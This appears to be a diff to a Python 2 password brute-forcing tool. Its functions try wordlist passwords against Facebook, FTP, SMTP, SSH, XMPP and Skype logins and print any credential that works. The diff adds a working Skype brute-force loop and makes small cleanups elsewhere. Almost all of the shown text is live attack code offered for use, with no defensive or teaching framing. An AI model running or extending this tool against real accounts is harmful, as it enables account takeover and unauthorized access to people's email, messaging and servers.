@@ -1,5 +1,4 @@
 ################################################################
-# TODO: installer.py or setup.py
 # TODO: Seperate method to read and seperate words in wordlist.
 # TODO: Wordlist generator
 # TODO: More protocols. Fix twitter bruteforce.
@@ -21,7 +20,7 @@ from random import *
 
 # New stuff! Should be installed thru requirements.txt.
 
-import smtplib, argparse, paramiko
+import smtplib, argparse, paramiko, skpy
 from fbchat import *
 from xmpp import *
 from ftplib import FTP
@@ -44,9 +43,6 @@ def facebookBruteforce(username, wordlist, delay):
         try:
             client = Client(str(username), password)
             print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
-            exit()
-        except KeyboardInterrupt:
-            print O + "[!] Keyboard Interrupt Detected! Stopping... [!]" + W
             exit()
         except:
              print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
@@ -77,6 +73,7 @@ def ftpBruteforce(address, username, wordlist, delay, port):
         except:
              print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
              sleep(delay)
+
 ################################################################
 # smtpBruteforce() method. Attacks SMTP protocol, aka email.
 # Attempts connection with SMTP server, and starts attack.
@@ -97,9 +94,8 @@ def smtpBruteforce(address, username, wordlist, delay, port):
         except Exception, e:
             print R + "[!] OOPs something went wrong! Check if you have typed everything correctly, as well as the email address [!]" + W
         except KeyboardInterrupt:
-            print O + "[!] Keyboard Interrupt Detected! Stopping... [!]" + W
             s.close()
-            exit()
+            exit(1)
         except:
              print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
              sleep(delay)
@@ -126,7 +122,7 @@ def ssh_connect(address, username, password, port, code=0):
         code = 1
     except socket.error, e:
         # Something went wrong.
-        print R + "[!] Error: Connection Failed. [!]"
+        print R + "[!] Error: Connection Failed. [!]" + W
         code = 2
 
     ssh.close()
@@ -153,7 +149,6 @@ def sshBruteforce(address, username, wordlist, port, delay):
             print e
             pass
         except KeyboardInterrupt:
-            print O + "[!] Keyboard Interrupt Detected! Stopping... [!]" + W
             ssh.close()
             exit()
 
@@ -179,7 +174,6 @@ def xmppBruteforce(address, port, username, wordlist, delay):
                 client.disconnect()
                 exit()
         except KeyboardInterrupt:
-            print O + "[!] Keyboard Interrupt Detected! Stopping... [!]" + W
             client.disconnect()
             exit()
         except:
@@ -195,3 +189,10 @@ def skypeBruteforce(username, wordlist, delay):
     # Processing wordlist...
     for i in wordlist.readlines():
         password = i.strip("\n")
+        try:
+            sk = skpy.Skype(username, password)
+            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
+            exit()
+        except skpy.core.SkypeAuthException:
+            print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
+            sleep(delay)
